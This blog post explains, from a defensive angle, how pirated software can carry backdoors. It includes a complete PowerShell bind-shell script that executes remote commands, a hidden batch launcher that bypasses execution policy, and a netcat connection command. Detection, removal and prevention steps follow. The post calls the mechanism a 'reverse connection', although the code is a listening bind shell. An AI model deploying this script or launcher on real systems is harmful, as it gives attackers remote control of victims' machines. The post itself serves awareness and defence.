---
title: "
Reverse Connections Embedded in Pirated Programs"
date: 2023-02-05 17:12:41
categories: [blueteam, monitoring]
tags: [zeek, logstash, kibana, blueteam, monitoring]
---

## The dangers of downloading and installing pirated software from the internet

Downloading and installing pirated software might seem like an easy and cheap way to get paid programs, but this practice can expose your system to serious security risks. One of the biggest dangers is the possibility that these pirated programs contain backdoors, such as reverse connections, that allow attackers to gain remote control of your system. In this article, we will explore how these mechanisms work and how you can protect yourself.

## What is a Reverse Connection?

A reverse connection is a method by which an attacker can gain remote access to your system. This is done by configuring a listener on a specific port that waits for incoming connections. When a user installs pirated software that contains this type of backdoor, the attacker can connect to the victim's system and execute commands remotely.

## Practical Example of a Reverse Connection with PowerShell

Let's see how this can be configured using PowerShell, one of the methods frequently used by attackers.

### Step 1: Creating a PowerShell Script for the Reverse Connection

The attacker can create a PowerShell script like the following and embed it in a pirated program:

```powershell
while ($true) {
    $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 1337)
    $listener.start()
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | % { 0 }
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}
```

### Step 2: Running the Script Hidden 

To ensure the script runs hidden, the attacker can create a .bat file that starts the PowerShell script in the background:


```cmd
@echo off
start /b powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0listener.ps1"
```

### Step 3: Testing the Connection 

After the victim installs and runs the pirated software, the attacker can check if the port is open and connect using tools like Netcat or Telnet:


```bash
nc [VICTIM_IP] 1337
```

## Dangers of Reverse Connections 
One of the biggest dangers of a reverse connection configured with a listener on `0.0.0.0` is that it allows anyone from anywhere in the world to connect to your system. This means that your computer can be accessed by any attacker who discovers the open port. The risks include: 
- **Credential Theft** : Attackers can capture credentials for emails, Google accounts, Microsoft accounts, social media, and other services.
 
- **System Monitoring** : They can monitor your activities, log keystrokes, and capture screenshots.
 
- **Data Theft** : Photos, documents, videos, and other files can be stolen.
 
- **Data Deletion** : Attackers can delete important files or even format the hard drive, resulting in irreparable data loss.
 
- **Malicious Use of Resources** : Your computer can be used for illegal activities such as DDoS attacks or cryptocurrency mining.

## Detecting and Terminating the Process 
 
1. **Identify the Process** : 
  - Open Command Prompt (cmd) as an administrator and run:

```cmd
netstat -aon | findstr :1337
```

  - Note the PID (Process ID) of the process listening on port 1337.
 
2. **Terminate the Process** : 
  - Run the command to terminate the process:

```cmd
taskkill /PID <PID> /F
```

## Removing the Firewall Rule 

If a firewall rule has been created to allow the connection, you can remove it:


```powershell
Remove-NetFirewallRule -DisplayName "Allow Port 1337"
```

## Prevention and Security 
 
- **Avoid Pirated Software** : The most effective way to protect your system is to avoid downloading and installing pirated software.
 
- **PowerShell Execution Policy** : Set a restrictive execution policy to prevent unauthorized script execution.

```powershell
Set-ExecutionPolicy Restricted
```
 
- **Monitor Suspicious Activities** : Use process monitoring tools to detect unusual activities.
 
- **Keep the System Updated** : Ensure your operating system and security tools are always up to date.

## Conclusion 

Using pirated software may seem like a cost-effective solution, but the risks far outweigh the benefits. Pirated programs often come with backdoors, such as reverse connections, that can give attackers control of your system. Protecting yourself against these risks involves avoiding pirated software, keeping your system updated, and monitoring for suspicious activities.